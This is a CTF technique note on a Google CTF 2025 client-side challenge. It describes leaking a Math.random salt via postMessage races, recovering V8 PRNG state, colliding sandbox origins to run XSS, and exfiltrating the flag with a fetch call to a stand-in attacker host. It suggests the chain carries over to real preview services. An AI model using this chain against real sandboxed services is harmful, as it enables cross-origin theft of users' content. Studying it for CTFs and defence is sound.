# CTF Web — Client-Side (2025-2026 era)

Client-side (browser) exploitation from elite 2025-2026 CTFs. Base patterns (XSS, CSRF, CSP, DOM clobbering, xs-leaks) in [client-side.md](client-side.md).

## Table of Contents
- [Salt-Based Same-Origin Iframe Collision via Math.random Prediction Chain (source: Google CTF 2025 Postviewer v5)](#salt-based-same-origin-iframe-collision-via-mathrandom-prediction-chain-source-google-ctf-2025-postviewer-v5)

---

## Salt-Based Same-Origin Iframe Collision via Math.random Prediction Chain (source: Google CTF 2025 Postviewer v5)

**Trigger:**
- Sandbox pattern "SafeContentFrame" / "ShadowDOM preview" / "isolated iframe" that loads user content on a per-file origin like `https://<hash>-<something>.scf.usercontent.goog` or `https://<hash>.sandbox.example/`.
- The hash is derived from a **Math.random()-based salt** — look for `Math.random().toString(36)` concatenated a few times, a random UUID generated client-side, or `crypto.getRandomValues` NOT used.
- Two classes of files exist: **cached** (URL/hash deterministic from content only) and **uncached** (salt mixed in); the flag file is one class, attacker files are the other.
- `postMessage` validates by hash-with-salt — if you know the salt, you can send arbitrary cross-origin messages accepted as trusted.

**Signals to grep in the frontend bundle:**
```
Math.random().toString(36)                   # salt generator
Math.floor(Math.random() * CONST)            # variant
location.replace(URL.createObjectURL(...))   # redirect-loop primitive available
window.addEventListener('message', (e) => {  # validates e.data.salt
iframe.contentWindow.postMessage({body, salt}, origin)
```

**Full 4-stage chain:**

### Stage 1 — Leak the salt via race condition

The application typically does:
```js
iframe.onload = () => iframe.contentWindow.postMessage({body, salt: currentSalt}, '*');
```
If you can ship a "leaker" file whose body is `onmessage = e => exfil(e.data.salt)`, every time your file is rendered the salt leaks. But the salt may only be sent **once** per iframe instance. Two tricks to force multiple emissions:

- **Reload-loop file:** body `location.replace(URL.createObjectURL(new Blob([body])))` forces the iframe to re-navigate, triggering another `onload` + salt transmission.
- **Slow-down gadget:** serve a body containing `<script>for(let i=0;i<1e8;i++){}` (or large `e.data` in a related handler) to delay main-thread events, widening the race window where the parent re-sends.

After ~5 rendering cycles you have 5 consecutive Math.random outputs.

### Stage 2 — V8 XorShift128+ state recovery

With 5 consecutive salts of ~11 chars of base36, you have enough entropy (≥ 64 bits) to recover the xs128p state. Use `d0nutptr/v8_rand_buster` or a Z3 model. **Watch out for the LIFO cache** — V8 refills a 64-element buffer from the state and consumes it in reverse order, so you need to know where your 5 samples fall in the cache (beginning, middle, split across a refill boundary). See [ctf-crypto/prng.md § V8 XorShift128+ State Recovery](../ctf-crypto/prng.md#v8-xorshift128-state-recovery-mathrandom-prediction).

Once state is recovered, you can predict thousands of future salts forward.

### Stage 3 — Plant an XSS payload on a predicted origin

The key insight: for **cached** files the hash is deterministic from content (no salt). For **uncached** files the hash includes salt. The attacker plants a cached file whose body is:

```html
<script>
  onmessage = e => {
    // receive the flag file's iframe reference from parent or window.opener
    leak(e.data.body);  // body is the flag file content
  };
</script>
```

The parent app will later, on its own schedule, render the flag (uncached) iframe on origin `https://<H(salt_N)>.scf.usercontent.goog`. Because we can predict `salt_N`, we compute `H(salt_N)` ahead of time and set our cached-file hash to collide. Both files end up rendered on the **same origin** — same-origin policy now lets the XSS in the cached file read `flag_iframe.contentDocument.body.textContent`.

### Stage 4 — Exfil

Our XSS runs when the target origin is visited; it grabs the flag iframe reference from `window.top` (the parent app registers it globally) and posts to our attacker domain:

```js
fetch('https://attacker/x', {
  method: 'POST',
  body: window.top.__currentFlagFrame__.contentDocument.body.innerText
});
```

**Key primitives required (shopping list):**
1. A way to make the same iframe fire `onload` multiple times (reload-loop or `URL.createObjectURL`).
2. A slow-down gadget on the main thread to widen race windows (big computation, large postMessage body, synchronous deserialization).
3. Predictable salt = one of: `Math.random`, `Math.random+Date.now`, time-seeded custom RNG. Anything `crypto.getRandomValues`-based kills the attack.
4. An XSS content channel whose URL is deterministic from content (cached / content-addressed).
5. The flag frame's reference must be reachable from the predicted origin — usually via `window.top` or `parent` because the sandbox container is same-origin with itself.

**Browser-specific note:** Chromium and Firefox schedule `onload`+`postMessage` events differently. On Chrome the race is easier (messages queue before navigation completes); on Firefox you may need an extra `Promise.resolve().then(...)` microtask fence. Test both.

**Generalizes to:** any content-sandboxing service (Slack file preview, Notion embeds, Discord activity hosting, Google Docs inline viewer) that uses time-seeded or Math.random-based per-item origins to "isolate" user content.
